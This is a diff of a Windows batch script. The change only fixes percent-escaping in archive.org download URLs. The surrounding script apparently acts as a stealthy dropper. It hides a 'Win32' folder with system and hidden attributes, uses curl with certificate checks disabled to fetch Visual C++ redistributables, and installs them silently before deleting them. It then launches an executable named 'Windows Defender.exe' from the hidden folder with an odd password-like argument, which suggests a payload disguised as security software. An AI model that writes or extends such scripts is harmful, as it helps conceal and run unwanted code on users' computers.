@@ -48,9 +48,9 @@ attrib +s +h +i "%environment%\Win32"
 
 reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
 
-if %OS%==32BIT "%environment%\curl.exe" -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%20C%2B%2B%20Redistributable%20for%20Visual%20Studio%202012%20Update%204.zip/vcredist_x86.exe -o "%temp%\vcredist_x86.exe" && "%temp%\vcredist_x86.exe" /Q && del "%temp%\vcredist_x86.exe"
+if %OS%==32BIT "%environment%\curl.exe" -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%%20C%%2B%%2B%%20Redistributable%%20for%%20Visual%%20Studio%%202012%%20Update%%204.zip/vcredist_x86.exe -o "%temp%\vcredist_x86.exe" && "%temp%\vcredist_x86.exe" /Q && del "%temp%\vcredist_x86.exe"
 
-if %OS%==64BIT "%environment%\curl.exe" -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%20C%2B%2B%20Redistributable%20for%20Visual%20Studio%202012%20Update%204.zip/vcredist_x86.exe -o "%temp%\vcredist_x86.exe" && "%temp%\vcredist_x86.exe" /Q && del "%temp%\vcredist_x86.exe" && "%environment%\curl.exe" -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%20C%2B%2B%20Redistributable%20for%20Visual%20Studio%202012%20Update%204.zip/vcredist_x64.exe -o "%temp%\vcredist_x64.exe" && "%temp%\vcredist_x64.exe" /Q && del "%temp%\vcredist_x64.exe" 
+if %OS%==64BIT "%environment%\curl.exe" -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%%20C%%2B%%2B%%20Redistributable%%20for%%20Visual%%20Studio%%202012%%20Update%%204.zip/vcredist_x86.exe -o "%temp%\vcredist_x86.exe" && "%temp%\vcredist_x86.exe" /Q && del "%temp%\vcredist_x86.exe" && "%environment%\curl.exe" -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%%20C%%2B%%2B%%20Redistributable%%20for%%20Visual%%20Studio%%202012%%20Update%%204.zip/vcredist_x64.exe -o "%temp%\vcredist_x64.exe" && "%temp%\vcredist_x64.exe" /Q && del "%temp%\vcredist_x64.exe" 
 
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
